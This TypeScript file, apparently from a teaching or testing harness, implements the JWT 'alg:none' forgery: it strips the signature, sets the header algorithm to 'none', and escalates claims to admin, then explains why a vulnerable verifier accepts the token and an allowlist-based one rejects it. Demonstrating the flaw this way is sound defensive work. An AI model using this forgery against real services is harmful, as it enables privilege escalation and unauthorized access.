/**
 * Attack: alg:none. Strip the signature, set the header alg to "none", and escalate
 * a claim (admin:true). A verifier that selects its routine from the token's alg will
 * skip signature checking entirely.
 *
 * Expected: ACCEPTED by the Vulnerable verifier, REJECTED by the Correct verifier
 * (because `none` is not in its allowlist).
 */

import { signNone } from '../jwt/sign.ts';
import { decodeUnsafe } from './types.ts';
import type { AttackResult } from './types.ts';

export function attackAlgNone(baseToken: string): AttackResult {
  const { header, claims } = decodeUnsafe(baseToken);

  const forgedClaims = { ...claims, admin: true, role: 'admin' };
  // Carry over a harmless header field but force alg:none and drop the original kid.
  const forgedToken = signNone({ typ: header.typ ?? 'JWT' }, forgedClaims);

  return {
    forgedToken,
    explanation: {
      title: 'alg:none',
      claimedAlg: 'none',
      verifierMistake:
        'The verifier reads the algorithm from the token header and runs the matching routine. For "none" that routine does no signature check.',
      whyItPassed:
        'claimed alg = "none"  →  verifier picks the "none" routine  →  no signature is verified  →  the escalated admin:true claim is trusted.',
      correctDefense:
        'The Correct verifier requires "none" to be on an explicit allowlist. It is not, so the token is rejected before any routine is chosen.',
      detail: [
        'Signature segment is empty (the token ends in a single trailing dot).',
        'Payload was modified to admin:true / role:admin.',
      ],
    },
  };
}
